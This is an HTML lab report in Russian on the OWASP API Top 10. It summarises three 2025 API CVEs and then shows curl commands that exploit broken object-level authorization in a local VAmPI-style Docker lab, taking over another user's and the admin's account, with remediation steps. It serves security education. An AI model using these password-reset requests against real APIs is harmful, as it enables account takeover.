@@ -1,0 +1,169 @@
+да, красоту наводила нейронка, зато красиво
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Лабораторная: OWASP API Top 10 — REST API</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        h1, h2, h3 {
+            color: #333;
+            border-bottom: 2px solid #e0e0e0;
+            padding-bottom: 10px;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background: #1e1e1e;
+            color: #d4d4d4;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-family: 'Consolas', 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        pre code {
+            background: none;
+            padding: 0;
+            color: inherit;
+        }
+        .cmd {
+            background: #2d2d2d;
+            color: #ccc;
+        }
+        .note {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 10px 15px;
+            margin: 15px 0;
+            border-radius: 4px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 15px 0;
+        }
+        th, td {
+            border: 1px solid #ddd;
+            padding: 8px 12px;
+            text-align: left;
+        }
+        th {
+            background: #f0f0f0;
+        }
+        hr {
+            margin: 30px 0;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h1>Лабораторная: OWASP API Top 10 — REST API</h1>
+    <p><strong>Стенд:</strong> <code>ket9/otus-devsecops-owasp-rest:latest</code> (по структуре эндпоинтов — клон VAmPI)</p>
+
+    <h2>Часть I. Три CVE за последний год</h2>
+    <p>Подобрала три уязвимости из разных категорий OWASP API Top 10 (2023), чтобы покрыть сразу BOLA, Broken Authentication и SSRF.</p>
+
+    <h3>CVE-2025-12030 — IDOR в плагине ACF to REST API (WordPress)</h3>
+    <p><strong>Категория:</strong> API1 — Broken Object Level Authorization. <strong>CWE-639</strong>.</p>
+    <p>Плагин добавляет в WordPress эндпоинт <code>POST /wp-json/acf/v3/{type}/{id}</code> для редактирования ACF-полей. В функции <code>update_item_permissions_check()</code> стоит только <code>current_user_can('edit_posts')</code> — это проверка «можешь ли ты в принципе что-то редактировать», а не «можешь ли ты редактировать конкретно вот этот объект». В итоге Contributor может править ACF-поля на чужих постах, у других пользователей и даже у глобальных опций сайта через <code>/options/{id}</code>.</p>
+
+    <h3>CVE-2025-9485 — обход проверки JWT в OAuth SSO для WordPress</h3>
+    <p><strong>Категория:</strong> API2 — Broken Authentication. <strong>CWE-347</strong>.</p>
+    <p>Плагин miniOrange OAuth SSO принимает <code>id_token</code> от внешних провайдеров. В функции <code>get_resource_owner_from_id_token()</code> токен декодируется, claims вытаскиваются и используются для логина — но подпись JWT никто не проверяет. То есть можно сформировать JWT с любым <code>email</code> и <code>sub</code>, поставить любую «подпись» — и плагин залогинит как того пользователя, чей email указан в payload, включая администратора.</p>
+
+    <h3>CVE-2025-20371 — неаутентифицированный blind SSRF в Splunk Enterprise</h3>
+    <p><strong>Категория:</strong> API7 — Server-Side Request Forgery. <strong>CWE-918</strong>.</p>
+    <p>Через определённые REST-эндпоинты Splunk неаутентифицированный атакующий заставляет Splunk-сервер делать произвольные исходящие HTTP-запросы. Ответ обратно не возвращается, поэтому SSRF «слепой» — но этого хватает, чтобы сканировать внутреннюю сеть по таймингам, дёргать metadata-сервисы облака (<code>169.254.169.254</code>) или тыкаться во внутренние API от имени Splunk.</p>
+
+    <hr>
+
+    <h2>Часть II. Эмуляция атаки</h2>
+
+    <h3>Подготовка стенда</h3>
+    <pre><code>docker pull ket9/otus-devsecops-owasp-rest
+docker run -d -p 8080:8080 ket9/otus-devsecops-owasp-rest:latest
+curl http://localhost:8080/createdb</code></pre>
+
+    <h3>Что я делала и что видела</h3>
+
+    <p><strong>Сначала посмотрела, кто уже в базе.</strong></p>
+    <pre><code>curl http://localhost:8080/users/v1</code></pre>
+
+    <p><strong>Дальше дёрнула <code>_debug</code>.</strong></p>
+    <pre><code>curl http://localhost:8080/users/v1/_debug</code></pre>
+
+    <p><strong>Зарегистрировала свою тестовую учётку (с рабочим email).</strong></p>
+    <pre><code>curl -X POST http://localhost:8080/users/v1/register -H "Content-Type: application/json" -d "{\"username\":\"hacker\",\"password\":\"hack123\",\"email\":\"hacker@example.com\"}"</code></pre>
+
+    <p><strong>Логин и получение токена (токен копируем вручную из вывода и сохраняем в переменную).</strong></p>
+    <pre><code>curl -X POST http://localhost:8080/users/v1/login -H "Content-Type: application/json" -d "{\"username\":\"hacker\",\"password\":\"hack123\"}"</code></pre>
+    <div class="note">
+        <strong>✏️ Важно:</strong> Из ответа копируем значение <code>auth_token</code> и сохраняем в переменную:<br>
+        <code>set TOKEN=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...</code>
+    </div>
+
+    <p><strong>Проверка: поменяла свой email (домен обязателен).</strong></p>
+    <pre><code>curl -X PUT http://localhost:8080/users/v1/hacker/email -H "Authorization: Bearer %TOKEN%" -H "Content-Type: application/json" -d "{\"email\":\"hacker_new@example.com\"}"</code></pre>
+    <p>Ожидаемый ответ: <code>204 No Content</code></p>
+
+    <p><strong>Атака — смена пароля чужого пользователя <code>name1</code>.</strong></p>
+    <pre><code>curl -i -X PUT http://localhost:8080/users/v1/name1/password -H "Authorization: Bearer %TOKEN%" -H "Content-Type: application/json" -d "{\"password\":\"pwned\"}"</code></pre>
+
+    <p><strong>Логин под взломанным <code>name1</code>.</strong></p>
+    <pre><code>curl -X POST http://localhost:8080/users/v1/login -H "Content-Type: application/json" -d "{\"username\":\"name1\",\"password\":\"pwned\"}"</code></pre>
+
+    <p><strong>Атака на админа.</strong></p>
+    <pre><code>curl -X PUT http://localhost:8080/users/v1/admin/password -H "Authorization: Bearer %TOKEN%" -H "Content-Type: application/json" -d "{\"password\":\"pwned\"}"</code></pre>
+    <pre><code>curl -X POST http://localhost:8080/users/v1/login -H "Content-Type: application/json" -d "{\"username\":\"admin\",\"password\":\"pwned\"}"</code></pre>
+
+    <h3>Что нашла</h3>
+    <p><strong>Основная уязвимость:</strong> на <code>PUT /users/v1/{username}/email</code> и <code>PUT /users/v1/{username}/password</code> сервер проверяет только факт аутентификации (валидный JWT — пускаем), но не сравнивает <code>username</code> из токена с <code>username</code> в URL. Любой залогиненный пользователь может поменять email или пароль любого другого пользователя, включая админа.</p>
+    <p><strong>Дополнительно:</strong> эндпоинт <code>/users/v1/_debug</code> возвращает всех пользователей со всеми полями, включая пароли в открытом виде.</p>
+
+    <h3>Тип уязвимости</h3>
+    <p>Основная уязвимость — <strong>API1:2023 — Broken Object Level Authorization (BOLA)</strong>, по CWE — <strong>CWE-639</strong>.</p>
+
+    <h3>Как это чинить</h3>
+    <ol>
+        <li>Проверять, что username в URL совпадает с subject из токена.</li>
+        <li>Вообще убрать username из URL для self-actions — использовать <code>/users/v1/me/password</code>.</li>
+        <li>Условие владения прямо в SQL — <code>WHERE username = ? AND username = current_user</code>.</li>
+        <li>Никаких отладочных ручек в проде — убрать <code>/_debug</code>.</li>
+        <li>Логирование и алёртинг — подозрительная активность по разным object key.</li>
+        <li>Контрактные тесты в CI — тест от имени userA к ресурсу userB должен возвращать 403.</li>
+    </ol>
+
+    <hr>
+
+    <h3>Источники</h3>
+    <ul>
+        <li>OWASP API Security Top 10 (2023) — <a href="https://owasp.org/API-Security/editions/2023/en/0x11-t10/">https://owasp.org/API-Security/editions/2023/en/0x11-t10/</a></li>
+        <li>VAmPI — Vulnerable API — <a href="https://github.com/erev0s/VAmPI">https://github.com/erev0s/VAmPI</a></li>
+        <li>CVE-2025-12030 — <a href="https://github.com/SnailSploit/CVE-2025-12030">https://github.com/SnailSploit/CVE-2025-12030</a></li>
+        <li>CVE-2025-9485 — <a href="https://zeropath.com/blog/cve-2025-9485-oauth-sso-wordpress-plugin-jwt-bypass">https://zeropath.com/blog/cve-2025-9485-oauth-sso-wordpress-plugin-jwt-bypass</a></li>
+        <li>CVE-2025-20371 — <a href="https://zeropath.com/blog/cve-2025-20371-splunk-blind-ssrf-summary">https://zeropath.com/blog/cve-2025-20371-splunk-blind-ssrf-summary</a></li>
+        <li>CWE-639 — <a href="https://cwe.mitre.org/data/definitions/639.html">https://cwe.mitre.org/data/definitions/639.html</a></li>
+        <li>OWASP IDOR Prevention Cheat Sheet — <a href="https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html</a></li>
+    </ul>
+</div>
+</body>
+</html>
